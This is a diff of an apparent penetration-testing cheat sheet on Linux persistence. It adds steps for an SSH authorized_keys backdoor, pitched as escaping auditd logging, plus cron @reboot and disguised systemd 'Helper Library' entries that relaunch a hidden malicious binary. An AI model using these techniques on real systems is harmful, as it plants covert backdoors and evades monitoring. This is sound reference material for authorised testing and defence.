@@ -159,8 +159,6 @@ msf6> sessions <id>
 
 - [GTFOBins](https://gtfobins.org/#+suid) – privilege escalation binaries
 
-Drop a ssh public key into *~/.ssh/authorized_keys* for a more stable backdoor compared to reverse shells
-
 ```bash
 # discover unprotected ssh-backup-key file
 $ ls /etc/ssh
@@ -193,7 +191,11 @@ $ /bin/env /bin/bash -p
 
 ## Persistence
 
-cron:
+Echo a ssh public key into *~/.ssh/authorized_keys* for a more stable backdoor compared to reverse shells. Echoing will not be logged in auditd because echo is a shell builtin.
+
+`echo "<public_key>" >> ~/.ssh/authorized_keys`
+
+### cron:
 
 - /etc/crontab
 - /etc/cron.d*
@@ -207,7 +209,7 @@ Example entry:
 @reboot nohup /home/<user>/.<hidden-dir>/malicious > /dev/null 2>&1 &
 ```
 
-systemd:
+### systemd service:
 
 - /etc/systemd/system/*
 - /lib/systemd/system/*
@@ -230,11 +232,12 @@ Example service entry:
 ```
 [Unit]
 Description=Helper Library
-Wants=netwoek-online.target
+Wants=network-online.target
 After=network-online.target
 
 [Service]
-ExecStart=/var/lib/misc/malicious
+ExecStart=/bin/sh -c "/var/lib/misc/malicious"
+Restart=always
 
 [Install]
 WantedBy=multi-user.target
